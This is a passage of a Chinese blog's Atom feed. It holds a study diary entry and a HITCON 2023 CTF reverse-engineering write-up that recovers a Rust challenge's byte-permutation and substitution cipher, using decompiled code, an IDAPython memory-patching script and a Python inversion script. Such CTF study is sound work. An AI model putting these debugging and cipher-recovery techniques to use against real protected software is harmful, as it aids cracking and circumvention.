<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jsjsj</title>
  
  <subtitle>Mr. Jsjsj&#39;s Blog</subtitle>
  <link href="https://jsjsj.top/atom.xml" rel="self"/>
  
  <link href="https://jsjsj.top/"/>
  <updated>2023-10-16T07:12:03.567Z</updated>
  <id>https://jsjsj.top/</id>
  
  <author>
    <name>Mr. Jsjsj</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>每周学习周记</title>
    <link href="https://jsjsj.top/2024/05/01/%E6%AF%8F%E5%91%A8%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0/"/>
    <id>https://jsjsj.top/2024/05/01/%E6%AF%8F%E5%91%A8%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0/</id>
    <published>2024-05-01T12:38:10.000Z</published>
    <updated>2023-10-16T07:12:03.567Z</updated>
    
    <content type="html"><![CDATA[<p><strong>前言：</strong>本篇用于记录本人每周每天的一个学习进度，这样通过写博客的方式来监督自己每天学到东西，每周周六会发布记录</p><h2 id="2023-7-10日—–2023-10-1日"><a href="#2023-7-10日—–2023-10-1日" class="headerlink" title="2023&#x2F;7&#x2F;10日—–2023&#x2F;10&#x2F;1日"></a>2023&#x2F;7&#x2F;10日—–2023&#x2F;10&#x2F;1日</h2><p>学习大语（一轮）</p><p>学习高数（两轮）</p><p>学习英语（一轮）</p><p>学习计算机基础（一轮）</p><p>9月1日入学考试：高数90（呜呜马虎了，其实能满分）、英语60（背了背单词）、大语62（文学常识加大力度）、计算机基础73（需要加大力度背）</p><p>结语：每日基本上都是10h+</p><p>10月1假期期间复习了之前所学</p><h2 id="2023-10-9日—–2023-10-15日"><a href="#2023-10-9日—–2023-10-15日" class="headerlink" title="2023&#x2F;10&#x2F;9日—–2023&#x2F;10&#x2F;15日"></a>2023&#x2F;10&#x2F;9日—–2023&#x2F;10&#x2F;15日</h2><p>大语（学习公务文书）<br>高数 (复习了无穷级数，2000题 无穷级数有点难)<br>英语 （复习了特殊巨型，又复习了之前学的基础语法名词）<br>计算机 （数据库篇章知识点背诵）<br>每天一篇古诗词鉴赏和每天一篇英语阅读理解，正常每天单词背诵<br>结语：每日基本上都是10h+</p><h2 id="2023-10-16日—–2023-10-22日"><a href="#2023-10-16日—–2023-10-22日" class="headerlink" title="2023&#x2F;10&#x2F;16日—–2023&#x2F;10&#x2F;22日"></a>2023&#x2F;10&#x2F;16日—–2023&#x2F;10&#x2F;22日</h2><p>more……………….</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;前言：&lt;/strong&gt;本篇用于记录本人每周每天的一个学习进度，这样通过写博客的方式来监督自己每天学到东西，每周周六会发布记录&lt;/p&gt;
&lt;h2 id=&quot;2023-7-10日—–2023-10-1日&quot;&gt;&lt;a href=&quot;#2023-7-10日—–2023-10</summary>
      
    
    
    
    
    <category term="周记" scheme="https://jsjsj.top/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>2023 Hitcon CTF The Blade Reverse</title>
    <link href="https://jsjsj.top/2023/10/14/2023%20Hitcon%20CTF%20The%20Blade%20Reverse/"/>
    <id>https://jsjsj.top/2023/10/14/2023%20Hitcon%20CTF%20The%20Blade%20Reverse/</id>
    <published>2023-10-14T13:55:12.000Z</published>
    <updated>2023-10-16T10:00:15.971Z</updated>
    
    <content type="html"><![CDATA[<p><strong>前言：很有意思一道Reverse题，在位移加密有很多巧妙方法，这里记录下做题的过程</strong></p><p>这道题学到了很多东西呜呜呜，本篇记录下调试当中的一些技巧方法和参照3cly师傅的博客一些加密的骚操作</p><p>此题是个rust 逆向题，是个socket类型的交互题，我们使用字符串定位的方法定位到关键部分，这里我定位到了如下代码位置（前部分找入口找到对应字符串直接交叉引用即可）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">_rust_dealloc();</span><br><span class="line">        <span class="keyword">goto</span> LABEL_178;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x67616C66</span>:   <span class="comment">// flag</span></span><br><span class="line">    v18 = <span class="number">9LL</span>;</span><br><span class="line">    v19 = <span class="string">&quot;IncorrectCorrectError: portscan: too many argumentsnetcatError: netcat: too many argumentsError: netcat: invalid portError: netcat: no input file specifiedUnknown command &#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v182 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v51 = seccomp_shell::shell::verify::h898bf5fa26dafbab(</span><br><span class="line">              input,                <span class="comment">// flag</span></span><br><span class="line">              *(_QWORD *)(v175 + <span class="number">24</span>),</span><br><span class="line">              *(_QWORD *)(v175 + <span class="number">40</span>));</span><br><span class="line">      v53 = v52;</span><br><span class="line">      <span class="keyword">if</span> ( v51 )</span><br><span class="line">        seccomp_shell::util::print_failed::h41a9d0b5672e2e2f(</span><br><span class="line">          <span class="string">&quot;IncorrectCorrectError: portscan: too many argumentsnetcatError: netcat: too many argumentsError: netcat: invalid portError: netcat: no input file specifiedUnknown command &#x27;&quot;</span>,</span><br><span class="line">          <span class="number">9LL</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>seccomp_shell::shell::verify::h898bf5fa26dafbab 它的传参就是我们要输出的字符串（flag) 这个函数就是我们要逆的主要函数</p><p>我们进到里面发现代码很多，这里我列出关键部分代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(dest, &amp;unk_62920, <span class="number">0x200</span>uLL);</span><br><span class="line">v52 = <span class="number">64LL</span>;</span><br><span class="line">v53 = (__int64 *)dest + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v54 = *(v53 - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v54 &gt; <span class="number">0x3F</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">  v55 = flag[v52 - <span class="number">1</span>];</span><br><span class="line">  flag[v52 - <span class="number">1</span>] = flag[v54];</span><br><span class="line">  flag[v54] = v55;</span><br><span class="line">  v56 = *v53;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)*v53 &gt; <span class="number">0x3F</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">  v57 = flag[v52 - <span class="number">2</span>];</span><br><span class="line">  flag[v52 - <span class="number">2</span>] = flag[v56];</span><br><span class="line">  flag[v56] = v57;</span><br><span class="line">  v53 += <span class="number">2</span>;</span><br><span class="line">  v52 -= <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v52 );</span><br></pre></td></tr></table></figure><p>我截取了最后的换位加密的代码，前面还有好几个这样的换位加密，但它换位加密的表在整个while循环一次下来都是固定的，在最外层的while循环里是256次，如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">while</span> ( v52 );</span><br><span class="line">  v58 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v59 = (<span class="type">unsigned</span> __int8)flag[v58] + <span class="number">1</span>;</span><br><span class="line">    LOWORD(v51) = <span class="number">1</span>;</span><br><span class="line">    LOWORD(v52) = <span class="number">257</span>;</span><br><span class="line">    v60 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v62 = v52;</span><br><span class="line">      LOWORD(v52) = (<span class="type">unsigned</span> __int16)v52 / (<span class="type">unsigned</span> __int16)v59;</span><br><span class="line">      v61 = v62 % (<span class="type">unsigned</span> __int16)v59;</span><br><span class="line">      v63 = v51;</span><br><span class="line">      v51 = v60 - v51 * v52;</span><br><span class="line">      LODWORD(v52) = v59;</span><br><span class="line">      v59 = (<span class="type">unsigned</span> __int16)(v62 % (<span class="type">unsigned</span> __int16)v59);</span><br><span class="line">      v60 = v63;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v61 );</span><br><span class="line">    v64 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (__int16)v63 &gt; <span class="number">0</span> )</span><br><span class="line">      v64 = v63;</span><br><span class="line">    flag[v58] = ((<span class="type">unsigned</span> __int16)(v64 + ((__int16)v63 &gt;&gt; <span class="number">15</span>) - v63) / <span class="number">0x101</span>u</span><br><span class="line">               + v63</span><br><span class="line">               + ((<span class="type">unsigned</span> __int16)v63 &gt;&gt; <span class="number">15</span>)</span><br><span class="line">               + <span class="number">113</span>) ^ <span class="number">0x89</span>;</span><br><span class="line">    v52 = v58 + <span class="number">1</span>;</span><br><span class="line">    v58 = v52;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v52 != <span class="number">64</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v8 != <span class="number">256</span> );</span><br></pre></td></tr></table></figure><p>在经历完换位加密后又进行了一次除取余的操作64次，这里猜测一次只能处理64个字节（其实就是64字节）通过这段加密将整个输入的字符串进行了一个除+取余等操作</p><p>经过逆向分析以上进行换位位移加密都是用的固定的索引，在以上换位加密代码和第二次加密的行为与用户输入值没有任何关系，用 00-ff 的映射（引用师傅的一句话逆向加密算法比较复杂，就找出 00-ff 的映射就行了 因为是按位加密的伐然后前面的几次打乱顺序由于是固定的表所以可以看成一次打乱顺序 找出索引交换的顺序即可）</p><p>生成 0~ff 的 hex 序列：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>, <span class="number">64</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytearray</span>(<span class="built_in">range</span>(i, i+<span class="number">64</span>)).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>这里先放这，我们测试的数据是flag 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{} 先把加密前的数据提取出来，我把断点下在了这个位置</p><p><img src="/images/re/1.png"></p><p>提取flag变量里的数据</p><p>数据是HfVl{qPcCYNMoRi6D7Jr}espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m</p><p>这是打乱后的字符串，也就是在经历下面加密前的字符串</p><p>下面我们用上面hex序列获取加密后的数据，为什么要生成256，因为整个wile循环是256所以我们要生成256个字字节分别进行64个字节的处理，总共调4次即可</p><p>我把断点下在了如下的位置：</p><p><img src="/images/re/2.png"></p><p><img src="/images/re/3.png"></p><p><img src="/images/re/4.png"></p><p>我下了如图两个断点，一个是加密前（打乱后），另一个是整个执行完一次后的加密</p><p>我们动调的时候用idapython脚本去把flag变量值给改下，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前选中的地址</span></span><br><span class="line">current_address = idc.get_screen_ea()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取堆栈上的指针变量地址</span></span><br><span class="line">stack_pointer = <span class="number">0x556646C923E0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要写入的非常长的数据按小端序存储</span></span><br><span class="line">data = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐字节将数据按小端序写入指定地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">4</span>):</span><br><span class="line">    value = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[i:i+<span class="number">4</span>])[<span class="number">0</span>]  <span class="comment"># 小端序</span></span><br><span class="line">    idaapi.patch_dword(stack_pointer + i, value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line">idaapi.msg(<span class="string">&quot;数据已按小端序写入堆栈地址: 0x&#123;:X&#125;\n&quot;</span>.<span class="built_in">format</span>(stack_pointer))</span><br></pre></td></tr></table></figure><p>f9运行到下面哪个断点提取的加密数据是</p><p>[0xFB, 0x7B, 0x4E, 0xBB, 0x51, 0x15, 0x8D, 0xDB, 0xB0, 0xAC, 0xA5, 0x8E, 0xAA, 0xB2, 0x60, 0xEB, 0x63, 0x5C, 0xDE, 0x42, 0x2B, 0xC6, 0xA6, 0x35, 0x30, 0x43, 0xD6, 0x5F, 0xBD, 0x24, 0xB1, 0xE3, 0x8C, 0xA7, 0xD5, 0x2A, 0x7C, 0x6D, 0x8B, 0x17, 0x9D, 0x83, 0xFE, 0x69, 0x10, 0x59, 0xA9, 0x9E, 0x0F, 0x1C, 0x66, 0x97, 0x5B, 0x61, 0xED, 0xAD, 0xE0, 0xDA, 0x27, 0x06, 0x25, 0xDC, 0x5E, 0xE7, 0x40, 0x41]</p><p>我们发现第一次提取到0x40前，因为一次加密只能处理64个字节，所以我们这里还要再进行3次处理剩余的序列，我们再在动调的时候把flag这个变量值改为0x40开始</p><p>第二次数据是4132D2D98FEEAF03933A00A2E1B3EC819FCA58B779FD3BA0020CCBA880C0164D2F75710A0439FFC19CABEFA4D8E214C26C641E6B7E992E090B86746AC42D4FF980</p><p>剩下再从80开始动调，直到00-255个数据加密完后就是我们动调后的加密密文</p><p>找到后，先还原下加密后的数据，这里参考了3cly师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data: <span class="built_in">list</span>, table: <span class="built_in">dict</span></span>):</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        tmp.append(table[i])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_order</span>(<span class="params">data:<span class="built_in">list</span>, table: <span class="built_in">list</span></span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        tmp.append(data[table[i]])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment">#get crypto table</span></span><br><span class="line">s0_255 = [<span class="number">0xFB</span>, <span class="number">0x7B</span>, <span class="number">0x4E</span>, <span class="number">0xBB</span>, <span class="number">0x51</span>, <span class="number">0x15</span>, <span class="number">0x8D</span>, <span class="number">0xDB</span>, <span class="number">0xB0</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0x8E</span>, <span class="number">0xAA</span>, <span class="number">0xB2</span>, <span class="number">0x60</span>, <span class="number">0xEB</span>, <span class="number">0x63</span>, <span class="number">0x5C</span>, <span class="number">0xDE</span>, <span class="number">0x42</span>, <span class="number">0x2B</span>, <span class="number">0xC6</span>, <span class="number">0xA6</span>, <span class="number">0x35</span>, <span class="number">0x30</span>, <span class="number">0x43</span>, <span class="number">0xD6</span>, <span class="number">0x5F</span>, <span class="number">0xBD</span>, <span class="number">0x24</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x8C</span>, <span class="number">0xA7</span>, <span class="number">0xD5</span>, <span class="number">0x2A</span>, <span class="number">0x7C</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0x17</span>, <span class="number">0x9D</span>, <span class="number">0x83</span>, <span class="number">0xFE</span>, <span class="number">0x69</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0xA9</span>, <span class="number">0x9E</span>, <span class="number">0x0F</span>, <span class="number">0x1C</span>, <span class="number">0x66</span>, <span class="number">0x97</span>, <span class="number">0x5B</span>, <span class="number">0x61</span>, <span class="number">0xED</span>, <span class="number">0xAD</span>, <span class="number">0xE0</span>, <span class="number">0xDA</span>, <span class="number">0x27</span>, <span class="number">0x06</span>, <span class="number">0x25</span>, <span class="number">0xDC</span>, <span class="number">0x5E</span>, <span class="number">0xE7</span>,</span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0xD2</span>, <span class="number">0xD9</span>, <span class="number">0x8F</span>, <span class="number">0xEE</span>, <span class="number">0xAF</span>, <span class="number">0x03</span>, <span class="number">0x93</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0xE1</span>, <span class="number">0xB3</span>, <span class="number">0xEC</span>, <span class="number">0x81</span>, <span class="number">0x9F</span>, <span class="number">0xCA</span>, <span class="number">0x58</span>, <span class="number">0xB7</span>, <span class="number">0x79</span>, <span class="number">0xFD</span>, <span class="number">0x3B</span>, <span class="number">0xA0</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0xCB</span>, <span class="number">0xA8</span>, <span class="number">0x80</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0x4D</span>, <span class="number">0x2F</span>, <span class="number">0x75</span>, <span class="number">0x71</span>, <span class="number">0x0A</span>, <span class="number">0x04</span>, <span class="number">0x39</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x9C</span>, <span class="number">0xAB</span>, <span class="number">0xEF</span>, <span class="number">0xA4</span>, <span class="number">0xD8</span>, <span class="number">0xE2</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x1E</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x2E</span>, <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0x86</span>, <span class="number">0x74</span>, <span class="number">0x6A</span>, <span class="number">0xC4</span>, <span class="number">0x2D</span>, <span class="number">0x4F</span>, <span class="number">0xF9</span>,</span><br><span class="line">        <span class="number">0xFA</span>, <span class="number">0x94</span>, <span class="number">0xB6</span>, <span class="number">0x1F</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0x5D</span>, <span class="number">0xE8</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0x5A</span>, <span class="number">0x65</span>, <span class="number">0x88</span>, <span class="number">0xC5</span>, <span class="number">0x7F</span>, <span class="number">0x77</span>, <span class="number">0x11</span>, <span class="number">0xCF</span>, <span class="number">0xF1</span>, <span class="number">0x1B</span>, <span class="number">0x3F</span>, <span class="number">0xF4</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x12</span>, <span class="number">0xE4</span>, <span class="number">0xBA</span>, <span class="number">0xDF</span>, <span class="number">0xE9</span>, <span class="number">0x62</span>, <span class="number">0x6E</span>, <span class="number">0xB4</span>, <span class="number">0x96</span>, <span class="number">0xCD</span>, <span class="number">0x13</span>, <span class="number">0x53</span>, <span class="number">0x4B</span>, <span class="number">0x28</span>, <span class="number">0xD7</span>, <span class="number">0xD1</span>, <span class="number">0x33</span>, <span class="number">0xB8</span>, <span class="number">0xE6</span>, <span class="number">0x7A</span>, <span class="number">0x2C</span>, <span class="number">0x9B</span>, <span class="number">0x29</span>, <span class="number">0x44</span>, <span class="number">0x52</span>, <span class="number">0xF7</span>, <span class="number">0x20</span>, <span class="number">0xF2</span>, <span class="number">0x31</span>, <span class="number">0xD3</span>, <span class="number">0xB9</span>, <span class="number">0x40</span>, <span class="number">0xD0</span>, <span class="number">0x34</span>, <span class="number">0xF5</span>, <span class="number">0x54</span>, <span class="number">0x1A</span>, <span class="number">0x01</span>, <span class="number">0xA1</span>, <span class="number">0x92</span>,</span><br><span class="line">        <span class="number">0xFC</span>, <span class="number">0x85</span>, <span class="number">0x07</span>, <span class="number">0xBE</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x19</span>, <span class="number">0xF3</span>, <span class="number">0x36</span>, <span class="number">0xF6</span>, <span class="number">0x72</span>, <span class="number">0x98</span>, <span class="number">0x4C</span>, <span class="number">0x7D</span>, <span class="number">0xC7</span>, <span class="number">0xD4</span>, <span class="number">0x45</span>, <span class="number">0x4A</span>, <span class="number">0x9A</span>, <span class="number">0xC3</span>, <span class="number">0x8A</span>, <span class="number">0xE5</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0xCC</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x67</span>, <span class="number">0xC9</span>, <span class="number">0x0E</span>, <span class="number">0x3C</span>, <span class="number">0x57</span>, <span class="number">0xF0</span>, <span class="number">0x22</span>, <span class="number">0xBF</span>, <span class="number">0x26</span>, <span class="number">0x84</span>, <span class="number">0x0D</span>, <span class="number">0x90</span>, <span class="number">0xA3</span>, <span class="number">0xAE</span>, <span class="number">0x3D</span>, <span class="number">0x1D</span>, <span class="number">0xC8</span>, <span class="number">0x91</span>, <span class="number">0x05</span>, <span class="number">0x87</span>, <span class="number">0x70</span>, <span class="number">0x08</span>, <span class="number">0x73</span>, <span class="number">0x21</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x3E</span>, <span class="number">0x37</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x56</span>, <span class="number">0xCE</span>, <span class="number">0x82</span>, <span class="number">0x38</span>, <span class="number">0x95</span>, <span class="number">0x78</span>, <span class="number">0xF8</span>]</span><br><span class="line"></span><br><span class="line">crypto_table = <span class="built_in">dict</span>(<span class="built_in">zip</span>(s0_255,<span class="built_in">range</span>(<span class="number">0x100</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get order table</span></span><br><span class="line">source = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">replaced = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi6D7Jr&#125;espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m&#x27;</span></span><br><span class="line">revsere_table = [] <span class="comment">#index 是 source 在 replace 中的下标</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> source:</span><br><span class="line">    revsere_table.append(replaced.find(i))</span><br><span class="line"></span><br><span class="line">tmp = [<span class="number">0x52</span>, <span class="number">0xCB</span>, <span class="number">0x15</span>, <span class="number">0x10</span>, <span class="number">0x7E</span>, <span class="number">0xD3</span>, <span class="number">0x78</span>, <span class="number">0x26</span>, <span class="number">0xC2</span>, <span class="number">0x14</span>, <span class="number">0x09</span>, <span class="number">0x50</span>, <span class="number">0x55</span>, <span class="number">0xFA</span>, <span class="number">0xEE</span>, <span class="number">0xC3</span>, <span class="number">0x0A</span>, <span class="number">0x97</span>, <span class="number">0xB9</span>, <span class="number">0x38</span>, <span class="number">0x12</span>, <span class="number">0x3D</span>, <span class="number">0x0E</span>, <span class="number">0xE9</span>, <span class="number">0xBE</span>, <span class="number">0xF6</span>, <span class="number">0x2B</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0xA8</span>, <span class="number">0x87</span>, <span class="number">0xAE</span>, <span class="number">0x1D</span>, <span class="number">0x53</span>, <span class="number">0x62</span>, <span class="number">0xEC</span>, <span class="number">0xFC</span>, <span class="number">0x5C</span>, <span class="number">0x88</span>, <span class="number">0x68</span>, <span class="number">0x23</span>, <span class="number">0x5B</span>, <span class="number">0x36</span>, <span class="number">0x13</span>, <span class="number">0xFB</span>, <span class="number">0xD7</span>, <span class="number">0xCA</span>, <span class="number">0x7A</span>, <span class="number">0xBD</span>, <span class="number">0xD9</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0xE4</span>, <span class="number">0x2A</span>, <span class="number">0x6C</span>, <span class="number">0x9D</span>, <span class="number">0x86</span>, <span class="number">0xE0</span>, <span class="number">0xA4</span>, <span class="number">0x01</span>, <span class="number">0xBA</span>, <span class="number">0x3B</span>, <span class="number">0x20</span>, <span class="number">0x92</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    tmp = decrypt(tmp, crypto_table)</span><br><span class="line">    tmp = reverse_order(tmp, revsere_table)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> tmp))</span><br><span class="line"><span class="comment"># 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span></span><br></pre></td></tr></table></figure><p>通过以上脚本我们发现可以还原原来的明文</p><p>tmp是我们0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}整个流程加密后的数据动调就可以得到，这里是占时的值，因为后面还有加密的操作</p><p>然后利用字母对应表还原，(这个操作算是学到了呜呜呜tql3cly师傅)</p><p>下一步我们接着往下调</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v8 != <span class="number">256</span> );</span><br><span class="line">v65 = (<span class="type">void</span> *)alloc::raw_vec::RawVec$LT$T$C$A$GT$::allocate_in::h9362616e9151d1f3(<span class="number">255LL</span>, <span class="number">0LL</span>);</span><br><span class="line">v67 = v66;</span><br><span 